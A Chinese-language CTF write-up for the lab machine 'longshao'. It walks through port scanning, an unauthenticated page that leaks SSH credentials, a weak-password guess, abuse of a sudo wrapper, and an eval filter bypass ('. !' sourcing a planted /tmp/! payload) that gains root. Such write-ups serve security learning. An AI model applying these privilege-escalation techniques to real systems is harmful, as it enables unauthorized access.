---
名称: longshao
作者: Sublarge
靶机ip: "192.168.56.108"
难度: Easy-Medium
---

> 关联：[[index|靶机记录]]、[[../常用命令/index|常用命令]]、[[../安全学习/rce提权/提权总览|提权总览]]

# 主机发现

靶机是本地 VirtualBox 网段里的机器，IP 是 `192.168.56.108`。

```bash
┌──(kali㉿JYlover)-[~/tmp]
└─$ nmap -p- 192.168.56.108
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 17:16 +0800
Nmap scan report for 192.168.56.108
Host is up (0.0084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

开放端口很少，就 SSH 和 HTTP。

# 信息收集

扫一下服务版本：

```bash
nmap -sV -sC -p22,80 192.168.56.108
```

结果：

```text
22/tcp open  ssh     OpenSSH 10.3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.67 ((Unix))
|_http-server-header: Apache/2.4.67 (Unix)
|_http-title: Maze 内部管理系统 - 登录
```

# Web 渗透

先随便看目录，发现 `dashboard.php` 可以直接访问：

```bash
curl http://192.168.56.108/dashboard.php
```

页面里直接给了 SSH 凭据：

```html
SSH 凭据：baolong:jinhua
```

这一步比较白给，登录 SSH：

```bash
ssh baolong@192.168.56.108
# password: jinhua
```

成功拿到第一个用户：

```bash
baolong@longshao:~$ id
uid=1000(baolong) gid=1000(baolong) groups=1000(baolong)

baolong@longshao:~$ ls
user.txt
```

第一个 flag：

```text
flag{user-...}
```

# 提权

先跑基础枚举：

```bash
uname -a
cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
sudo -l
```

系统是 Alpine：

```text
Linux longshao 7.0.10-0-stable #1-Alpine SMP PREEMPT_DYNAMIC 2026-05-23 11:50:19 x86_64 Linux

NAME="Alpine Linux"
VERSION_ID=3.24.0_alpha20260127
PRETTY_NAME="Alpine Linux edge"
```

用户有三个：

```bash
cat /etc/passwd
```

```text
baolong:x:1000:1000::/home/baolong:/bin/bash
chaojibaolong:x:1001:1001::/home/chaojibaolong:/bin/bash
chaojiwudilong:x:1002:1002::/home/chaojiwudilong:/bin/bash
```

这里很明显不是直接 root，应该要横向。

## 横向到 chaojibaolong

发现 `/opt/internal` 下面有一个只能 `chaojibaolong` 组执行的文件：

```bash
baolong@longshao:~$ ls /opt/internal/ -la
total 24
drwxr-xr-x    2 root     root              4096 May 28 11:08 .
drwxr-xr-x    3 root     root              4096 May 26 15:33 ..
-rwxr-x---    1 root     chaojibaolong    14152 May 28 11:08 parser_core
```

这个就是提示我们要先横向到 `chaojibaolong`。

弱口令试出来：

```text
chaojibaolong:love123
```

登录：

```bash
ssh chaojibaolong@192.168.56.108
# password: love123
```

## parser_core 分析

运行一下：

```bash
chaojibaolong@longshao:/opt/internal$ ./parser_core
[!] Security Violation: Core parser must retain eUID 0.
```

拉回本地简单分析：

```bash
scp chaojibaolong@192.168.56.108:/opt/internal/parser_core /tmp/parser_core
file /tmp/parser_core
strings /tmp/parser_core
checksec --file=/tmp/parser_core
objdump -d -M intel /tmp/parser_core
```

strings 里有几个关键内容：

```text
[!] Security Violation: Core parser must retain eUID 0.
[!] Compliance Error: Only *.log files are authorized.
[!] Path Restriction: Access denied.
[*] DevSecOps Emergency Notice: Switching context...
--debug
.log
/tmp/
chaojiwudilong
/bin/su
```

大概逻辑：

```text
1. 检查 uid 必须是 0
2. 只允许 /tmp/ 开头的 .log 文件
3. 如果文件不存在，并且带 --debug，就执行 /bin/su 切到 chaojiwudilong
```

一开始我绕远了，后来重新看 `sudo -l` 才发现关键点。

```bash
chaojibaolong@longshao:/opt/internal$ sudo -l
Matching Defaults entries for chaojibaolong on longshao:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User chaojibaolong may run the following commands on longshao:
    (ALL : ALL) NOPASSWD: /usr/local/bin/check_parser
```

看一下 `check_parser`：

```bash
cat /usr/local/bin/check_parser
```

```sh
#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
  echo "syslog-rotate: general protection fault: permission denied." >&2
  exit 1
fi

if [ -z "$1" -a ! -f "$1" ]; then
    echo "Usage: $(basename $0) <target_spool_path> [--force-cron]"
    exit 1
fi

exec /opt/internal/parser_core "$@"
```

也就是说我们可以通过 sudo 让 `parser_core` 以 root 上下文执行，然后触发 `--debug` 分支切到 `chaojiwudilong`。

```bash
sudo /usr/local/bin/check_parser /tmp/no_such_file.log --debug
```

拿到 `chaojiwudilong`：

```bash
id
uid=1002(chaojiwudilong) gid=1002(chaojiwudilong) groups=1002(chaojiwudilong)
```

## chaojiwudilong 到 root

继续看 sudo：

```bash
sudo -l
```

```text
User chaojiwudilong may run the following commands on longshao:
    (root) NOPASSWD: /usr/local/bin/a.sh
```

查看脚本：

```bash
cat /usr/local/bin/a.sh
```

```sh
PATH=/usr/bin

cd /tmp

read CMD < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$CMD"
```

这个脚本会读取一行输入，把字母、数字、斜杠都删掉，然后 `eval`。

看起来过滤挺狠，但是还保留了 `.`、空格、`!` 这种符号。我们可以在 `/tmp` 下放一个文件名叫 `!` 的脚本，然后输入：

```bash
. !
```

过滤后还是：

```bash
. !
```

于是 root 会 source `/tmp/!`。

先写 payload：

```bash
cat > /tmp/! << 'EOF'
/bin/cat /root/root.txt > /tmp/root.out 2>&1
id >> /tmp/root.out 2>&1
EOF
```

然后通过 `a.sh` 触发：

```bash
printf '. !\n' | sudo /usr/local/bin/a.sh
```

读取结果：

```bash
cat /tmp/root.out
```

成功：

```text
flag{root-e0bf0dabcccb7d4519c0ad4b431aff16}
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# 总结

这台机器主线还是比较清晰的：

```text
Web 未授权 dashboard.php
-> 泄露 baolong:jinhua
-> 横向 chaojibaolong:love123
-> sudo check_parser
-> parser_core --debug 切到 chaojiwudilong
-> sudo a.sh
-> 利用符号绕过过滤，source /tmp/!
-> root
```

几个坑点：

1. `parser_core` 不是直接提权点，它是配合 `sudo /usr/local/bin/check_parser` 用的。
2. 横向后一定要重新跑 `sudo -l`，不然很容易绕远。
3. `a.sh` 过滤了字母数字和 `/`，但是没过滤 `.` 和 `!`，所以 `. !` 这种 shell 语法可以绕。
4. `PATH=/usr/bin`，payload 里用 `cat` 会找不到，所以要写 `/bin/cat`。

